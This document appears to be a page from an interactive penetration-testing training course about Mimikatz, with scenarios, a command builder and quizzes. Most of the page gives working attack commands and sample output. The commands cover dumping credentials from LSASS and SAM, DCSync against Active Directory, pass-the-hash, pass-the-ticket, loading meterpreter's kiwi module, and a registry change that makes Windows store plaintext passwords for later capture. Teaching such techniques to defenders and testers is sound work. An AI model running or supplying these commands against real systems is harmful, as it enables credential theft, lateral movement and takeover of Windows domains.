# Mimikatz

Mimikatz is a post-exploitation Windows tool that extracts plaintext passwords, NTLM hashes, Kerberos tickets, and PIN codes directly from Windows memory (LSASS). It is the de facto standard for credential dumping after gaining a foothold on a Windows system.

## Overview

Mimikatz is essential for:
- **Credential Dumping**: Extract plaintext passwords and NTLM hashes from Windows memory
- **Pass-the-Hash**: Authenticate as a user using only their NTLM hash — no plaintext needed
- **Pass-the-Ticket**: Steal and reuse Kerberos tickets for lateral movement
- **Privilege Escalation**: Elevate to SYSTEM or abuse Kerberos for domain-level access

### Installation

Mimikatz runs on Windows. On Kali Linux, use it via a Windows target or Wine.

```bash
# Pre-built release (run on target Windows machine)
# Download from: https://github.com/gentilkiwi/mimikatz/releases

# On Kali — deliver to target via Metasploit or file transfer
# Or load directly via meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

:::command-builder{id="mimikatz-builder"}
tool_name: mimikatz
target_placeholder: ""
scan_types:
  - name: "Dump All Credentials"
    flag: "sekurlsa::logonpasswords"
    desc: "Extract all credentials from LSASS memory"
  - name: "Dump SAM Hashes"
    flag: "lsadump::sam"
    desc: "Dump local account hashes from the SAM database"
  - name: "Dump Domain Hashes"
    flag: "lsadump::dcsync"
    desc: "Simulate a domain controller to pull any user's hash"
  - name: "List Kerberos Tickets"
    flag: "kerberos::list"
    desc: "List Kerberos tickets in memory"
options:
  - name: "Elevate Privilege"
    flag: "privilege::debug"
    desc: "Enable SeDebugPrivilege to access LSASS"
  - name: "Export Tickets"
    flag: "/export"
    desc: "Save Kerberos tickets to disk for reuse"
  - name: "Pass the Hash"
    flag: "sekurlsa::pth"
    desc: "Spawn a process authenticated with a hash"
  - name: "Patch LSASS"
    flag: "misc::memssp"
    desc: "Install SSP to capture future plaintext credentials"
:::

## Core Concepts

### Why LSASS?

The **Local Security Authority Subsystem Service (LSASS)** is the Windows process responsible for enforcing security policy and handling authentication. It caches credentials in memory to support features like single sign-on — which makes it the prime target for credential dumping.

### Required Privileges

Mimikatz requires **SYSTEM** or **local Administrator** privileges to read LSASS memory. The first command in almost every Mimikatz session is:

```
privilege::debug
```

This enables `SeDebugPrivilege`, allowing access to processes owned by other users including LSASS.

### Basic Workflow

```
1. privilege::debug          # Enable debug privilege (required)
2. sekurlsa::logonpasswords  # Dump credentials from LSASS memory
3. lsadump::sam              # Dump local account hashes (needs SYSTEM)
4. lsadump::dcsync /user:Administrator  # Pull domain admin hash via DCSync
```

---

:::scenario{id="scenario-1" level="beginner"}
title: "Dump Credentials from LSASS"
goal: "Extract plaintext passwords and NTLM hashes from all logged-on users."
hint: "Run mimikatz.exe as Administrator, enable debug privilege first, then run logonpasswords. On modern Windows, WDigest is disabled by default so plaintext may be empty — but NTLM hashes are always available."
command: "privilege::debug\nsekurlsa::logonpasswords"
expected_output: |
  mimikatz # privilege::debug
  Privilege '20' OK

  mimikatz # sekurlsa::logonpasswords

  Authentication Id : 0 ; 123456 (00000000:0001e240)
  Session           : Interactive from 1
  User Name         : jsmith
  Domain            : CORP
  Logon Server      : DC01
  Logon Time        : 2/27/2026 9:00:00 AM
  SID               : S-1-5-21-...

           msv :
            [00000003] Primary
            * Username : jsmith
            * Domain   : CORP
            * NTLM     : e19ccf75ee54e06b1f5f94d1db5ab3ee
            * SHA1     : ...
           wdigest :
            * Username : jsmith
            * Domain   : CORP
            * Password : (null)
           kerberos :
            * Username : jsmith
            * Domain   : CORP.LOCAL
            * Password : (null)
:::

:::scenario{id="scenario-2" level="beginner"}
title: "Dump Local SAM Database Hashes"
goal: "Extract NTLM hashes for all local accounts from the SAM database."
hint: "The SAM (Security Account Manager) stores hashes for local accounts. This requires SYSTEM privileges. Run 'token::elevate' to impersonate SYSTEM if you have local admin."
command: "privilege::debug\ntoken::elevate\nlsadump::sam"
expected_output: |
  mimikatz # token::elevate
  Token Id  : 0
  User name :
  SID name  : NT AUTHORITY\SYSTEM

  mimikatz # lsadump::sam
  Domain : WIN10-PC
  SysKey : 1a2b3c4d...

  RID  : 000001f4 (500)
  User : Administrator
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

  RID  : 000001f5 (501)
  User : Guest
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
:::

:::scenario{id="scenario-3" level="intermediate"}
title: "DCSync – Pull Domain Admin Hash Without Touching DC"
goal: "Simulate a domain controller replication request to extract any user's hash from Active Directory."
hint: "DCSync abuses the MS-DRSR protocol that domain controllers use to replicate. If your compromised account has Replicating Directory Changes permissions (e.g., Domain Admin), you can pull any user's hash remotely — including krbtgt for Golden Ticket attacks."
command: "lsadump::dcsync /domain:corp.local /user:Administrator"
expected_output: |
  mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

  [DC] 'corp.local' will be the domain
  [DC] 'DC01.corp.local' will be the DC server
  [DC] 'Administrator' will be the user account

  Object RDN           : Administrator

  ** SAM ACCOUNT **
  SAM Username         : Administrator
  Account Type         : 30000000 ( USER_OBJECT )
  User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
  NTLM               : fc525c9683e8fe067095ba2ddc971889
  SHA1               : d3c02a0f53...
:::

:::scenario{id="scenario-4" level="intermediate"}
title: "Pass-the-Hash – Authenticate Without a Plaintext Password"
goal: "Use a captured NTLM hash to open a shell as another user without knowing their password."
hint: "Pass-the-Hash spawns a new process with a forged authentication token built from the NTLM hash. The hash is used directly for NTLM authentication — Windows never needs the plaintext."
command: "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd.exe"
expected_output: |
  mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:cmd.exe

  user    : Administrator
  domain  : CORP
  program : cmd.exe
  impers. : no
  NTLM    : fc525c9683e8fe067095ba2ddc971889
    |  PID  1337
    |  TID  2048
    |\ CMD   : cmd.exe
    \-> RPC control...OK

  # A new cmd.exe window opens authenticated as Administrator
  # Use it to access network resources: net use \\DC01\C$
:::

## Tips & Tricks

```bash
# Run all credential dumping at once (via Metasploit kiwi module)
meterpreter > load kiwi
meterpreter > creds_all

# Export Kerberos tickets to .kirbi files for reuse
kerberos::list /export

# Import a ticket for Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Enable WDigest to capture plaintext on next login (persistence)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

---

:::quiz{id="quiz-1"}
Q: What Windows process does Mimikatz target to extract credentials?
- [ ] winlogon.exe
- [ ] svchost.exe
- [x] lsass.exe
- [ ] csrss.exe
:::

:::quiz{id="quiz-2"}
Q: What privilege must be enabled before running most Mimikatz commands?
- [ ] SeTakeOwnershipPrivilege
- [x] SeDebugPrivilege (privilege::debug)
- [ ] SeImpersonatePrivilege
- [ ] SeLoadDriverPrivilege
:::

:::quiz{id="quiz-3"}
Q: What does a Pass-the-Hash attack use to authenticate instead of a plaintext password?
- [ ] A Kerberos ticket
- [ ] An SSL certificate
- [x] The user's NTLM hash
- [ ] A session cookie
:::

## Quick Reference

| Command | Purpose |
|---------|---------|
| `privilege::debug` | Enable SeDebugPrivilege (required first) |
| `token::elevate` | Impersonate SYSTEM token |
| `sekurlsa::logonpasswords` | Dump all credentials from LSASS |
| `sekurlsa::pth /user /domain /ntlm /run` | Pass-the-Hash |
| `lsadump::sam` | Dump local SAM hashes |
| `lsadump::dcsync /user` | Pull hash via DC replication (no touch to DC) |
| `kerberos::list /export` | Export Kerberos tickets |
| `kerberos::ptt ticket.kirbi` | Inject ticket (Pass-the-Ticket) |
| `misc::memssp` | Patch LSASS to capture future plaintext |
| `exit` | Quit Mimikatz |
